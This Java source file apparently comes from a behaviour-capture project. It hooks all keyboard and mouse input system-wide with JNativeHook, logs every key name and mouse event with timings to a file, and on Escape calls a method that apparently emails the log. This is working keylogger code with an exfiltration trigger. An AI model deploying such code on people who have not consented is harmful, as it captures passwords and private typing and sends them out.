/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package ai;

import java.util.logging.Level;
import java.util.logging.Logger;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
import org.jnativehook.mouse.NativeMouseEvent;
import org.jnativehook.mouse.NativeMouseInputListener;
import org.jnativehook.mouse.NativeMouseWheelEvent;
import org.jnativehook.mouse.NativeMouseWheelListener;

/**
 *
 * @author qbex
 */
public class ListenerAdapter implements NativeKeyListener, NativeMouseInputListener, NativeMouseWheelListener {

    long startTime;
    long endTime;

    @Override
    public void nativeKeyTyped(NativeKeyEvent e) {
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        this.endTime = System.nanoTime();
        long t = this.endTime - this.startTime;
        FileManager fm = new FileManager();
        fm.write("Key,Pressed," + t + "," + e.getKeyText(e.getKeyCode()));
        this.startTime = System.nanoTime();

        if (e.getKeyCode() == NativeKeyEvent.VC_ESCAPE) {
            EmailManager email = new EmailManager();
            email.enviarCorreo();
        }

    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent e) {
        this.endTime = System.nanoTime();
        long t = this.endTime - this.startTime;
        FileManager fm = new FileManager();
        fm.write("Key,Released," + t + "," + e.getKeyText(e.getKeyCode()));
        this.startTime = System.nanoTime();
    }

    @Override
    public void nativeMouseClicked(NativeMouseEvent e) {

    }

    @Override
    public void nativeMousePressed(NativeMouseEvent e) {
        this.endTime = System.nanoTime();
        long t = this.endTime - this.startTime;
        FileManager fm = new FileManager();
        fm.write("Mouse,Pressed," + t + "," + e.getButton());
        this.startTime = System.nanoTime();
    }

    @Override
    public void nativeMouseReleased(NativeMouseEvent e) {
        this.endTime = System.nanoTime();
        long t = this.endTime - this.startTime;
        FileManager fm = new FileManager();
        fm.write("Mouse,Released," + t + "," + e.getButton());
        this.startTime = System.nanoTime();

    }

    @Override
    public void nativeMouseMoved(NativeMouseEvent e) {
        this.endTime = System.nanoTime();
        long t = this.endTime - this.startTime;
        FileManager fm = new FileManager();
        fm.write("Mouse,Moved," + t + "," + e.getX() + "," + e.getY());
        this.startTime = System.nanoTime();

    }

    @Override
    public void nativeMouseDragged(NativeMouseEvent e) {
        this.endTime = System.nanoTime();
        long t = this.endTime - this.startTime;
        FileManager fm = new FileManager();
        fm.write("Mouse,Dragged," + t + "," + e.getX() + "," + e.getY());
        this.startTime = System.nanoTime();

    }

    @Override
    public void nativeMouseWheelMoved(NativeMouseWheelEvent e) {
        this.endTime = System.nanoTime();
        long t = this.endTime - this.startTime;
        FileManager fm = new FileManager();
        fm.write("Mouse,Wheel," + t + "," + e.getWheelRotation());
        this.startTime = System.nanoTime();

    }
}
